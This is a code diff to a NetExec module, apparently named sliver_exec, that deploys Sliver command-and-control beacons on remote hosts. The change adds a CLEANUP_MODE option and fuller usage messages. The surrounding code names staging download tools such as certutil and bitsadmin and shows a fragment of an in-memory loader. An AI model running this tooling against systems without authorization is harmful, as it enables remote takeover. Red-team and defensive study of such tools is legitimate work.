@@ -722,7 +722,7 @@ class NXCModule:
         self.wait_seconds = 90
         self.rhost = None
         self.rport = None
-        self.cleanup = True
+        self.cleanup_mode = "always"  # "always", "success", or "never"
         self.staging = False
         self.stager_rhost = None
         self.stager_rport = None
@@ -761,13 +761,17 @@ class NXCModule:
             "STAGER_RPORT", "STAGER_PROTOCOL", "STAGER_PORT", "STAGING_METHOD",
             "BEACON_INTERVAL", "BEACON_JITTER",
             # New simplified staging options
-            "STAGING_PORT", "DOWNLOAD_TOOL"
+            "STAGING_PORT", "DOWNLOAD_TOOL",
+            # New cleanup mode option
+            "CLEANUP_MODE"
         }
 
         # Check for unknown options
         for key in module_options:
             if key not in known_options:
                 context.log.fail(f"Unknown option: {key}")
+                context.log.fail("Valid options: RHOST, RPORT, STAGING, STAGING_PORT, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP, WAIT, PROFILE")
+                context.log.fail("See: nxc <protocol> -M sliver_exec --options")
                 sys.exit(1)
 
         # Acceptable option sets:
@@ -778,6 +782,13 @@ class NXCModule:
 
         if not (has_rhost or has_profile):
             context.log.fail("Either RHOST OR PROFILE must be provided")
+            context.log.fail("")
+            context.log.fail("Examples:")
+            context.log.fail("  Using RHOST:   -o RHOST=10.0.0.5")
+            context.log.fail("  Using RHOST with custom port: -o RHOST=10.0.0.5 RPORT=8888")
+            context.log.fail("  Using PROFILE: -o PROFILE=my_profile")
+            context.log.fail("")
+            context.log.fail("See: nxc <protocol> -M sliver_exec --options")
             sys.exit(1)
 
         # If RHOST provided, validate it and optional RPORT
@@ -788,6 +799,8 @@ class NXCModule:
                 ipaddress.IPv4Address(module_options["RHOST"])
             except ipaddress.AddressValueError:
                 context.log.fail(f"RHOST must be a valid IPv4 address: {module_options['RHOST']}")
+                context.log.fail("")
+                context.log.fail("Example: -o RHOST=10.0.0.5")
                 sys.exit(1)
 
             # Validate RPORT if provided (optional, defaults to 443)
@@ -798,6 +811,8 @@ class NXCModule:
                         raise ValueError()
                 except (ValueError, TypeError):
                     context.log.fail(f"RPORT must be a valid port number (1-65535): {module_options['RPORT']}")
+                    context.log.fail("")
+                    context.log.fail("Example: -o RHOST=10.0.0.5 RPORT=8888")
                     sys.exit(1)
 
         # If PROFILE provided, validate simple presence (more validation occurs later)
@@ -853,6 +868,8 @@ class NXCModule:
                         raise ValueError()
                 except (ValueError, TypeError):
                     context.log.fail(f"STAGING_PORT must be a valid port number (1-65535): {staging_port}")
+                    context.log.fail("")
+                    context.log.fail("Example: -o STAGING=http STAGING_PORT=8080")
                     sys.exit(1)
 
             # Validate STAGING_METHOD or DOWNLOAD_TOOL if provided (support both old and new names)
@@ -862,7 +879,22 @@ class NXCModule:
                 valid_methods = ["powershell", "certutil", "bitsadmin", "wget", "curl", "python"]
                 if staging_method not in valid_methods:
                     context.log.fail(f"DOWNLOAD_TOOL must be one of: {', '.join(valid_methods)} (default: powershell)")
+                    context.log.fail("")
+                    context.log.fail("Example: -o STAGING=http DOWNLOAD_TOOL=certutil")
                     sys.exit(1)
+        
+        # Validate CLEANUP_MODE if provided
+        cleanup_value = module_options.get("CLEANUP_MODE")
+        if cleanup_value:
+            cleanup_str = str(cleanup_value).lower()
+            if cleanup_str not in ("always", "success", "never"):
+                context.log.fail(f"CLEANUP_MODE must be one of: always, success, never (default: always)")
+                context.log.fail("")
+                context.log.fail("Examples:")
+                context.log.fail("  -o CLEANUP_MODE=always    # Always cleanup (default)")
+                context.log.fail("  -o CLEANUP_MODE=success   # Only cleanup if beacon registered")
+                context.log.fail("  -o CLEANUP_MODE=never     # Never cleanup")
+                sys.exit(1)
 
     def _parse_module_options(self, context, module_options):
         """
@@ -877,11 +909,12 @@ class NXCModule:
         if "RPORT" in module_options and module_options.get("RPORT") is not None:
             self.rport = int(module_options["RPORT"])
         else:
-            # Default RPORT to 443 if RHOST is provided
             self.rport = 443 if self.rhost else None
         
-        self.cleanup = module_options.get("CLEANUP", "True").lower() in ("true", "1", "yes")
+        cleanup_value = module_options.get("CLEANUP_MODE", "always")
+        self.cleanup_mode = str(cleanup_value).lower()
         
+
         # Parse STAGING option (supports both old and new syntax)
         # Old: STAGING=True/False + STAGER_PROTOCOL=http/tcp/https
         # New: STAGING=http/tcp/https (protocol embedded in STAGING value)
@@ -1160,7 +1193,7 @@ class NXCModule:
                 handler.execute(context, connection, full_remote_path, os_type)
 
             self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, 
-                                            cleanup=self.cleanup, 
+                                            cleanup_mode=self.cleanup_mode, 
                                             listener_job_id=listener_job_id, 
                                             website_name=website_name)
 
@@ -1679,7 +1712,7 @@ $addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
         tmp_file.close()
         return tmp_file.name
 
-    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=True, listener_job_id=None, website_name=None):
+    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup_mode="always", listener_job_id=None, website_name=None):
         """
         Wait for beacon via Sliver polling, then optionally cleanup using handler cmd.
         Falls back to timeout if polling fails.
@@ -1692,18 +1725,29 @@ $addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
             implant_name: Generated implant name
             handler: Protocol handler
             protocol: Protocol name
-            cleanup: Whether to cleanup
+            cleanup_mode: When to cleanup - "always", "success", or "never"
             listener_job_id: HTTP listener job ID to kill (for HTTP staging cleanup)
             website_name: Sliver website name to remove (for HTTP staging cleanup)
         """
 
-        if not self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds):
-            if cleanup:
+        beacon_registered = self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds)
+        
+        if not beacon_registered:
+            if cleanup_mode != "never":
                 context.log.display("Beacon not detected within timeout — cleaning up anyway")
             else:
                 context.log.display("Beacon not detected within timeout")
+        
+        # Determine if we should cleanup based on cleanup_mode
+        should_cleanup = False
+        if cleanup_mode == "always":
+            should_cleanup = True
+        elif cleanup_mode == "success" and beacon_registered:
+            should_cleanup = True
+        elif cleanup_mode == "never":
+            should_cleanup = False
 
-        if cleanup:
+        if should_cleanup:
             # Cleanup HTTP staging resources (listener + website)
             if listener_job_id:
                 try:
